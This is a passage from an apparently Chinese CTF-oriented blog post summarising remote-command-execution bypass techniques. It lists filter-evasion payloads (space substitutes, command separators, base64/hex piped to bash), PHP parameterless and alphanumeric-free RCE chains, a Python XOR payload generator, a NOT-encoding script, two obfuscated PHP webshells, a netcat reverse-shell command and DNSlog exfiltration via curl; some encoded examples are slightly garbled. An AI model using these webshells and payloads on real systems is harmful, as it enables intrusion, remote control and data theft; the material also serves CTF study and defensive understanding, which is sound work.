      <link href="/2024/01/19/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-RCE/"/>
      <url>/2024/01/19/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-RCE/</url>
      
        <content type="html"><![CDATA[<h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><p>替代:<br>&lt;、&lt;&gt;、%20(space)，%09(tab)、${IFS}、$IFS、$IFS$1、$IFS$9(最后的数字可以改)</p><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><p>作用:<a href="https://blog.csdn.net/weixin_43847838/article/details/111602811">https://blog.csdn.net/weixin_43847838/article/details/111602811</a></p><p>windows: %0a &amp; | %1a<br>liunx: %0a %0d ; &amp; | &amp;&amp; ||(分号就是正常的连接两条语句)</p><h2 id="花括号的别样用法"><a href="#花括号的别样用法" class="headerlink" title="花括号的别样用法"></a>花括号的别样用法</h2><p>在Linux bash中还可以使用{OS COMMAND,ARGUMENT}来执行系统命令，比如{cat,flag}</p><h2 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h2><p>比如a&#x3D;fl;b&#x3D;ag;cat $a$b</p><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base64，例如 echo“Y2F0lC9mbGFn&quot;|base64-dlbash ==&gt; cat /flag</span><br><span class="line">hex，例如 echo636174202f666c6167&quot;|xxd -r-p|bash ==&gt; cat /flag</span><br><span class="line">oct,例如 $(printf&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt; cat /flag</span><br></pre></td></tr></table></figure><h2 id="单引号和双引号绕过"><a href="#单引号和双引号绕过" class="headerlink" title="单引号和双引号绕过"></a>单引号和双引号绕过</h2><p>比如:ca“tflag 或ca””t flag</p><h2 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h2><p>比如: ca\t fl\ag</p><h2 id="利用Shell特殊变量绕过"><a href="#利用Shell特殊变量绕过" class="headerlink" title="利用Shell特殊变量绕过"></a>利用Shell特殊变量绕过</h2><p>linux shell中$n表示传递给脚本或函数的参数，比如:ca$@tflas@q</p><h2 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux下可以用1&gt;a创建文件名为a的空文件</span><br><span class="line">ls -t&gt;test则会将目录按时间排序后写进test文件中</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure><h2 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的内联执行重音符(反引号)作指令替代</span><br><span class="line">意思是以某一个指令的输出结果作为另一个指令的输入顶。<span class="keyword">echo</span> <span class="string">&quot;a`pwd”:echo “abcd $(pwd)</span></span><br></pre></td></tr></table></figure><p>echo `ls`;<br>echo $(ls);<br>?&gt;&lt;?=`ls`;<br>?&gt;&lt;?&#x3D;$(ls);</p><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><p>* 匹配任意长度任意字符<br>? 匹配任意单个字符<br>[list] 匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合<br>[^list] 匹配指定范围外的任意单个字符或字符集合([!list]同[^list])<br>{str1,str2} 匹配str1或者str2字符，也可以是集合<br>IFS 由&lt;space&gt;或&lt;tab&gt;<br>CR 由&lt;enter&gt;产生<br>! 执行history中的命令</p><p>常用如:cat f*</p><h2 id="参数逃逸"><a href="#参数逃逸" class="headerlink" title="参数逃逸"></a>参数逃逸</h2><p>比如var_dump(file_get_contents($_POST[‘a’]));&amp;a&#x3D;&#x2F;<br>flag</p><h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>详解:<a href="https://blog.csdn.net/2301_76690905/article/details/133808536">https://blog.csdn.net/2301_76690905/article/details/133808536</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())))); <span class="comment">//查看和读取当前目录文件</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))); <span class="comment">//查看上一级目录的文件</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));  <span class="comment">//查看上一级目录的文件</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))))))); <span class="comment">//读取上级目录文件</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())))))))))));<span class="comment">//读取上级目录文件</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">phpversion</span>())))))))))))))));<span class="comment">//读取上级目录文件</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localtime</span>(<span class="title function_ invoke__">time</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>()))))))))))));<span class="comment">//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位</span></span><br><span class="line">  <span class="comment">//查看和读取根目录文件</span></span><br><span class="line">  <span class="comment">//查看和读取根目录文件</span></span><br></pre></td></tr></table></figure><h2 id="无字母数字RCE"><a href="#无字母数字RCE" class="headerlink" title="无字母数字RCE"></a>无字母数字RCE</h2><p>详解:<a href="https://www.freebuf.com/articles/network/279563.html">https://www.freebuf.com/articles/network/279563.html</a></p><p>异或脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">word = <span class="built_in">input</span>(<span class="string">&quot;Input word:&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> word:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&quot;a&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;!&quot;^&quot;@&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;b&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;!&quot;^&quot;@&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;c&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;#&quot;^&quot;@&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;d&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;$&quot;^&quot;@&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;e&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;%&quot;^&quot;@&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;f&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;&amp;&quot;^&quot;@&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;g&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;&#x27;&#x27;(&quot;&#x27;&quot;^&quot;@&quot;)&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;h&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;@&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;i&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;)&quot;^&quot;@&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;j&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;*&quot;^&quot;@&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;k&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;+&quot;^&quot;@&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;,&quot;^&quot;@&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;m&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;-&quot;^&quot;@&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;n&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;.&quot;^&quot;@&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;o&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;/&quot;^&quot;@&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;p&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;/&quot;^&quot;_&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;q&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;/&quot;^&quot;^&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;.&quot;^&quot;\\&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;s&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;-&quot;^&quot;^&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;t&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;/&quot;^&quot;[&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;u&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;]&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;v&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;^&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;w&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;_&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;x&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;&amp;&quot;^&quot;^&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;y&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;&#x27;&#x27;(&quot;&#x27;&quot;^&quot;^&quot;)&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;z&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;&amp;&quot;^&quot;\\&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;A&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;!&quot;^&quot;`&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;B&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;&lt;&quot;^&quot;~&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;C&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;#&quot;^&quot;`&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;D&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;$&quot;^&quot;`&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;E&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;%&quot;^&quot;`&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;F&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;&amp;&quot;^&quot;`&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;G&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;:&quot;^&quot;&#125;&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;H&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;`&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;I&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;)&quot;^&quot;`&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;J&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;*&quot;^&quot;`&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;K&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;+&quot;^&quot;`&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;L&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;,&quot;^&quot;`&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;M&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;-&quot;^&quot;`&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;N&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;.&quot;^&quot;`&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;O&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;/&quot;^&quot;`&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;P&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;@&quot;^&quot;~&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;Q&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;-&quot;^&quot;|&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;R&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;.&quot;^&quot;|&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;S&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;&#123;&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;T&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;|&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;U&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;&#125;&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;V&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;~&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;W&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;)&quot;^&quot;~&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;X&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;#&quot;^&quot;&#123;&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;Y&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;$&quot;^&quot;&#123;&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;Z&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;$&quot;^&quot;~&quot;)&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload:\n&quot;</span>+payload)</span><br></pre></td></tr></table></figure><p>取反脚本:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure><p>异或webshell:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line">​</span><br><span class="line"><span class="comment">// 密码为 &quot;_&quot;</span></span><br></pre></td></tr></table></figure><p>取反webshell(需进行url编码):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);<span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;的&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;半&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;始&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$_____</span>=_;<span class="variable">$___</span>=<span class="string">&quot;俯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;次&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;站&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$_</span>=<span class="variable">$$_____</span>;<span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br><span class="line">或:</span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);<span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;<span class="variable">$___</span>=瞰;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=和;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=和;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=的;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=半;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=始;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$_____</span>=_;<span class="variable">$___</span>=俯;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=瞰;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=次;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=站;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$_</span>=<span class="variable">$$_____</span>;<span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br></pre></td></tr></table></figure><h2 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>条件：具有nc</p><p>命令:<code>nc -e /bin/bash ip port</code></p><p>然后再在服务器上开启端口接听</p><h3 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h3><p>发起一个dns请求需要通过linux中的ping命令或者curl命令</p><p>然后这里一个dnslog的利用平台:<a href="http://ceye.io/">http://ceye.io/</a></p><p>作为命令的分隔符，然后发起curl请求，然后最后用反引号执行命令</p><h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><p>特定情况下压缩flag文件,并访问</p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
